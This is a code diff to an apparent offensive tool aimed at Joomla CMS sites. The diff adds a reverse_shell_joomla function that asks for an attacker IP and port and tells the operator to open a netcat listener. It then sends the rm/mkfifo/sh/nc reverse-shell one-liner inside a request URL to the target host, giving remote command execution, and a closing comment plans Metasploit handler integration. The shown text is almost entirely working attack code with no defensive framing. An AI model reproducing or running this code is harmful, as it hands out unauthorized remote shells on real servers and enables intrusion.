@@ -125,7 +125,24 @@ def webshell_joomla(host):
             print(response.content.decode('utf-8').rstrip())
 
 
-        
+def reverse_shell_joomla(host):
+    print("Enter the selected port: ")
+    user_port = input()
+    print(f"Lunch your netcat: nc -lvnp {user_port}")
+
+    print("Enter your ip: ")
+    user_ip = input()
+
+    reverse_shell_cmd = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {user_ip} {user_port} >/tmp/f"
+
+    new_url = f"{host}{reverse_shell_cmd}"
+    print(f"[+] Your ip: {user_ip}")
+    print(f"[+] Your port: {user_port}")
+    print("[+] Launching the reverse shell")
+    requests.get(new_url)
+
+    # Todo : look to use the multi/handler from msf directly within the tool ?
+
 
 def main():
     parser = argparse.ArgumentParser(description='Jumbo loves to put some RCE in CMS')
